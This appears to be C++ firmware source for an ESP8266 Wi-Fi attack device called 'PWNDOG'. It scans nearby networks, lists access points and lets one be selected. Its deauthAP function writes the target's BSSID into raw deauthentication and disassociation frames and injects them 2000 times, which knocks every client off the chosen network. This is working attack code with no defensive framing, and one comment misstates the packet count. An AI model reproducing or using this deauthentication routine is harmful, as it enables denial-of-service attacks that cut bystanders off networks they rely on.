#include "WifiController.h"

WifiController::WifiController()
{
    m_aplist = new APListController();
}

WifiController::~WifiController()
{

}

void WifiController::init()
{
    changeAPMode();
}

void WifiController::changeSTAMode()
{
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
}

void WifiController::changeAPMode()
{
    IPAddress apIP(192,168,5,1);

    WiFi.mode(WIFI_AP_STA);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));
    WiFi.softAP("PWNDOG");
    delay(100);
}

void WifiController::selectCurrentNode()
{
  m_selected = getCurrentAPInfo();
}

void WifiController::scanEnvironment()
{
    String ssid;
    char chssid[255];
    uint8_t * bssid;
    int32_t rssi;
    uint8_t encryptionType;
    int32_t channel;
    bool hidden;
    int total_results = 0;

    Serial.println("Starting Wifi Scan....");

    total_results = WiFi.scanNetworks(/*async=*/false, /*hidden=*/false);

    if(total_results == 0)
    {
        Serial.println("No networks found.... :(");
    }
    else
    {
        Serial.print(total_results);
        Serial.println(" total of networks found!");
        for(int i = 0; i < total_results; i++)
        {
            WiFi.getNetworkInfo(i, ssid, encryptionType, rssi, bssid, channel, hidden);
            rssi = 2 * (rssi + 100);
            Serial.print("SSID: "); Serial.println(ssid);
            Serial.print("RSSI: "); Serial.println(rssi);
            Serial.print("Channel: "); Serial.println(channel);
            
            ssid.toCharArray(chssid, 32);

            // Check if AP exists
            AP * ap = m_aplist->getAPFromSSID(chssid);
            if(ap == NULL)
            { 
              m_aplist->createNode(chssid, bssid, rssi, 10, channel);
            }
            else
            {
              ap->setSignal(rssi); // Update the RSSI only
            }
            debugPrintNodes();
        }

        // When the list is created, change the current node to the first network added
        m_aplist->changeCurrentNode();
    }
}

void WifiController::deauthAP()
{
    Serial.println("Deauthing all the clients in one AP....");
    AP * current_ap = m_selected;
    
    // Set Source AP
    memcpy(&deauthPacket[10], current_ap->getBSSID(), 6);
    memcpy(&deauthPacket[16], current_ap->getBSSID(), 6);
    
    // Set channel
    wifi_set_channel(current_ap->getChannel());
    delay(1);

    // Send 10000 deauth packets
    
    for(int i = 0; i < 1000; i++)
    {
        deauthPacket[0] = 0xC0;
        wifi_send_pkt_freedom(deauthPacket, 26, 0);
        deauthPacket[0] = 0xA0;
        wifi_send_pkt_freedom(deauthPacket, 26, 0);
        delay(10);
    }
}

AP * WifiController::getCurrentAPInfo()
{
    // Get Current AP
    AP * current_ap = m_aplist->getAPFromCurrentNode();
    
    return current_ap;
}

int WifiController::getTotalAPs()
{
  return m_aplist->getTotalNodes();  
}

void WifiController::changeCurrentNode()
{
    // Move to the next node
    m_aplist->changeCurrentNode();
}

void WifiController::debugPrintNodes()
{
  m_aplist->debugPrintNodes();
}
